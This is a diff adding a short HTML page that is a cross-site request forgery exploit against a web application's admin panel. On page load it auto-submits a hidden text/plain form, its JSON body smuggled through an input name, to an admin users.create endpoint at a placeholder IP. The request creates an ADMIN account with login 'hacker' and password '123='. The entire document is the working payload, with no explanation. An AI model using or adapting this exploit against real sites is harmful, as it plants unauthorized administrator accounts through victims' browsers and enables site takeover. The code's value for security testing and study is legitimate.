@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+      <form id="myform" enctype="text/plain" action="http://IP/admin/?object=users.create" method="POST">
+        <input id="json" type="hidden" name='json' value='"}'>
+      </form>
+    <script>
+      $(document).ready(function() {
+      $("#json").attr("name",'{"type":"ADMIN","preferences":{"language":"ru","timezone":"UTC"},"login":"hacker","new_password":"123=","new_password_confirmation":"123');
+      $("#myform").submit(); });
+    </script>
+  </body>
+</html>
